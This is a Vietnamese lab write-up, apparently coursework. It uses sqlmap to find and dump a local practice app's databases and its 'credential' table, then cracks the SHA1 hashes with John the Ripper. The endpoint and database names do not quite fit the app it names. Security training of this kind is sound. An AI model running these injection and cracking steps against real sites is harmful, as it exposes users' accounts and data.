
# Task 2: Attack on the database of bWapp

## 1. Cài đặt bWapp
- Cài đặt bWapp theo tài liệu tại [quang-ute/Security-labs/Web-security](https://github.com/quang-ute/Security-labs).
- Khởi chạy bWapp và đảm bảo rằng hệ thống đang hoạt động trên localhost (hoặc docker).

## 2. Cài đặt sqlmap
- Cài đặt sqlmap (một công cụ tự động kiểm tra lỗ hổng SQL Injection) bằng cách sử dụng câu lệnh:
  ```bash
  sudo apt install sqlmap
  ```
  
---

## Question 1: Use sqlmap to get information about all available databases

### Answer 1:
Để lấy thông tin về tất cả các database có trên website mục tiêu, sử dụng sqlmap với tham số `--dbs`.

**Bước 1**: Xác định endpoint cần tấn công bằng cách thử đăng nhập vào trang bWapp với thông tin bất kỳ. Sau đó, kiểm tra mạng (F12 trên trình duyệt) để xác định điểm kết nối.

- Khi truy cập vào trang đăng nhập bWapp, chúng ta thấy yêu cầu được gửi đến endpoint:
  ```
  http://localhost:3128/unsafe_home.php?username=test&password=test
  ```

**Bước 2**: Vì chúng ta đang chạy bên trong docker, cần thay thế cổng 3128 bằng cổng 80.

**Bước 3**: Chạy câu lệnh sqlmap để lấy thông tin về các database có sẵn:
  ```bash
  sqlmap -u "http://localhost:80/unsafe_home.php?username=test&password=test" --dbs
  ```

---

## Question 2: Use sqlmap to get tables, users information

### Answer 2:
Sau khi lấy được thông tin về các database (ví dụ: `information_schema` và `sqllab_users`), chúng ta sẽ tiếp tục khai thác các bảng và thông tin người dùng từ database `sqllab_users`.

**Bước 1**: Lấy các bảng từ database `sqllab_users` bằng lệnh:
  ```bash
  sqlmap -u "http://localhost:80/unsafe_home.php?username=test&password=test" -D sqllab_users --tables
  ```

**Bước 2**: Lấy toàn bộ dữ liệu từ bảng `credential` trong database `sqllab_users`:
  ```bash
  sqlmap -u "http://localhost:80/unsafe_home.php?username=test&password=test" -D sqllab_users -T credential --dump
  ```

- **Kết quả**: Bảng `credential` chứa thông tin người dùng với các mật khẩu đã được mã hóa (hashed).

---

## Question 3: Use John the Ripper to disclose the password of all database users from the above exploit

### Answer 3:
Ở câu hỏi trước, chúng ta đã dump được các mật khẩu hashed từ bảng `credential`. Bây giờ, chúng ta sẽ sử dụng công cụ John the Ripper để crack các mật khẩu này.

**Bước 1**: Lưu các mật khẩu đã mã hóa vào một file (ví dụ: `hash_pw.txt`).

**Bước 2**: Xác định loại mã hóa của mật khẩu bằng cách sử dụng thư viện hashid trong Python:
  ```bash
  hashid -mj hash_pw.txt
  ```

- **Kết quả**: Hashid chỉ ra rằng các mật khẩu được mã hóa bằng thuật toán `raw-SHA1`.

**Bước 3**: Sử dụng John the Ripper để crack các mật khẩu:
  ```bash
  john --format=Raw-SHA1 hash_pw.txt
  ```
  
- **Kết quả**: Tất cả các mật khẩu đã được crack thành công.

---
